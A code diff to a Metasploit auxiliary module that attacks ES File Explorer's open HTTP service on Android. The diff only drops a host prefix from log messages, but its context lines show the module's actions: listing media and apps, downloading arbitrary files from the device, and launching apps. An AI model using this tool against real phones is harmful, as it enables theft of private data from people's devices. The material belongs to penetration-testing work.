@@ -74,15 +74,15 @@ class MetasploitModule < Msf::Auxiliary
     when action.name == 'LISTFILES'
       res = http_post('listFiles')
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable or Bad Response")
+        print_error("Not Vulnerable or Bad Response")
         return
       end
       path = store_loot('listFiles.json', 'application/json', target_host, res.body, 'es_file_explorer_listfiles.json')
-      vprint_good("#{peer}- Result saved to #{path}")
+      vprint_good("Result saved to #{path}")
       json_resp = JSON.parse(sanitize_json(res.body))
       pretty_response = "#{peer}\n"
       json_resp.each do |f|
@@ -92,15 +92,15 @@ class MetasploitModule < Msf::Auxiliary
     when action.name == 'LISTPICS'
       res = http_post('listPics')
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable or Bad Response")
+        print_error("Not Vulnerable or Bad Response")
         return
       end
       path = store_loot('listPics.json', 'application/json', target_host, res.body, 'es_file_explorer_listpics.json')
-      vprint_good("#{peer}- Result saved to #{path}")
+      vprint_good("Result saved to #{path}")
       json_resp = JSON.parse(sanitize_json(res.body))
       pretty_response = "#{peer}\n"
       json_resp.each do |f|
@@ -110,15 +110,15 @@ class MetasploitModule < Msf::Auxiliary
     when action.name == 'LISTVIDEOS'
       res = http_post('listVideos')
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable or Bad Response")
+        print_error("Not Vulnerable or Bad Response")
         return
       end
       path = store_loot('listVideos.json', 'application/json', target_host, res.body, 'es_file_explorer_listvideos.json')
-      vprint_good("#{peer}- Result saved to #{path}")
+      vprint_good("Result saved to #{path}")
       json_resp = JSON.parse(sanitize_json(res.body))
       pretty_response = "#{peer}\n"
       json_resp.each do |f|
@@ -128,15 +128,15 @@ class MetasploitModule < Msf::Auxiliary
     when action.name == 'LISTAUDIOS'
       res = http_post('listAudios')
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable or Bad Response")
+        print_error("Not Vulnerable or Bad Response")
         return
       end
       path = store_loot('listAudio.json', 'application/json', target_host, res.body, 'es_file_explorer_listaudio.json')
-      vprint_good("#{peer}- Result saved to #{path}")
+      vprint_good("Result saved to #{path}")
       json_resp = JSON.parse(sanitize_json(res.body))
       pretty_response = "#{peer}\n"
       json_resp.each do |f|
@@ -146,15 +146,15 @@ class MetasploitModule < Msf::Auxiliary
     when action.name == 'LISTAPPS'
       res = http_post('listApps')
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable or Bad Response")
+        print_error("Not Vulnerable or Bad Response")
         return
       end
       path = store_loot('listApps.json', 'application/json', target_host, res.body, 'es_file_explorer_listapps.json')
-      vprint_good("#{peer}- Result saved to #{path}")
+      vprint_good("Result saved to #{path}")
       json_resp = JSON.parse(sanitize_json(res.body))
       pretty_response = "#{peer}\n"
       json_resp.each do |f|
@@ -164,15 +164,15 @@ class MetasploitModule < Msf::Auxiliary
     when action.name == 'LISTAPPSSYSTEM'
       res = http_post('listAppsSystem')
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable or Bad Response")
+        print_error("Not Vulnerable or Bad Response")
         return
       end
       path = store_loot('listAppsSystem.json', 'application/json', target_host, res.body, 'es_file_explorer_listappssystem.json')
-      vprint_good("#{peer}- Result saved to #{path}")
+      vprint_good("Result saved to #{path}")
       json_resp = JSON.parse(sanitize_json(res.body))
       pretty_response = "#{peer}\n"
       json_resp.each do |f|
@@ -182,15 +182,15 @@ class MetasploitModule < Msf::Auxiliary
     when action.name == 'LISTAPPSPHONE'
       res = http_post('listAppsPhone')
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable or Bad Response")
+        print_error("Not Vulnerable or Bad Response")
         return
       end
       path = store_loot('listAppsPhone.json', 'application/json', target_host, res.body, 'es_file_explorer_listappsphone.json')
-      vprint_good("#{peer}- Result saved to #{path}")
+      vprint_good("Result saved to #{path}")
       json_resp = JSON.parse(sanitize_json(res.body))
       pretty_response = "#{peer}\n"
       json_resp.each do |f|
@@ -200,15 +200,15 @@ class MetasploitModule < Msf::Auxiliary
     when action.name == 'LISTAPPSSDCARD'
       res = http_post('listAppsSdcard')
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable or Bad Response")
+        print_error("Not Vulnerable or Bad Response")
         return
       end
       path = store_loot('listAppsSdcard.json', 'application/json', target_host, res.body, 'es_file_explorer_listappssdcard.json')
-      vprint_good("#{peer}- Result saved to #{path}")
+      vprint_good("Result saved to #{path}")
       json_resp = JSON.parse(sanitize_json(res.body))
       pretty_response = "#{peer}\n"
       json_resp.each do |f|
@@ -218,15 +218,15 @@ class MetasploitModule < Msf::Auxiliary
     when action.name == 'LISTAPPSALL'
       res = http_post('listAppsAll')
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable or Bad Response")
+        print_error("Not Vulnerable or Bad Response")
         return
       end
       path = store_loot('listAppsAll.json', 'application/json', target_host, res.body, 'es_file_explorer_listappsall.json')
-      vprint_good("#{peer}- Result saved to #{path}")
+      vprint_good("Result saved to #{path}")
       json_resp = JSON.parse(sanitize_json(res.body))
       pretty_response = "#{peer}\n"
       json_resp.each do |f|
@@ -236,17 +236,17 @@ class MetasploitModule < Msf::Auxiliary
     when action.name == 'GETDEVICEINFO'
       res = http_post('getDeviceInfo')
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable or Bad Response")
+        print_error("Not Vulnerable or Bad Response")
         return
       end
       path = store_loot('getDeviceInfo.json', 'application/json', target_host, res.body, 'es_file_explorer_getdeviceinfo.json')
-      vprint_good("#{peer}- Result saved to #{path}")
+      vprint_good("Result saved to #{path}")
       json_resp = JSON.parse(sanitize_json(res.body))
-      print_good("#{peer}- Name: #{json_resp['name']}")
+      print_good("Name: #{json_resp['name']}")
     when action.name == 'GETFILE'
       unless datastore['ACTIONITEM'].start_with?('/')
         print_error('Action item is a path for GETFILE, like /system/app/Browser.apk')
@@ -257,15 +257,15 @@ class MetasploitModule < Msf::Auxiliary
         'ctype' => 'application/json'
       )
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable, Bad Response.  File may not be available for download.")
+        print_error("Not Vulnerable, Bad Response.  File may not be available for download.")
         return
       end
       path = store_loot('getFile', 'application/octet-stream', target_host, res.body, datastore['ACTIONITEM'])
-      print_good("#{peer}- #{datastore['ACTIONITEM']} saved to #{path}")
+      print_good("#{datastore['ACTIONITEM']} saved to #{path}")
     when action.name == 'APPLAUNCH'
       if datastore['ACTIONITEM'].empty?
         print_error('Action item is a path for GETFILE, like com.android.chrome')
@@ -277,18 +277,18 @@ class MetasploitModule < Msf::Auxiliary
         'ctype' => 'application/json'
       )
       unless res
-        print_error("#{peer}- Error Connecting")
+        print_error("Error Connecting")
         return
       end
       unless res.code == 200
-        print_error("#{peer}- Not Vulnerable, Bad Response.  File may not be available for download.")
+        print_error("Not Vulnerable, Bad Response.  File may not be available for download.")
         return
       end
       if res.body.include?('NameNotFoundException')
-        print_error("#{peer}- Application #{datastore['ACTIONITEM']} not found on device")
+        print_error("Application #{datastore['ACTIONITEM']} not found on device")
         return
       elsif res.body.include?('{"result":"0"}')
-        print_good("#{peer}- #{datastore['actionitem']} launched successfully")
+        print_good("#{datastore['actionitem']} launched successfully")
       end
     end
   end
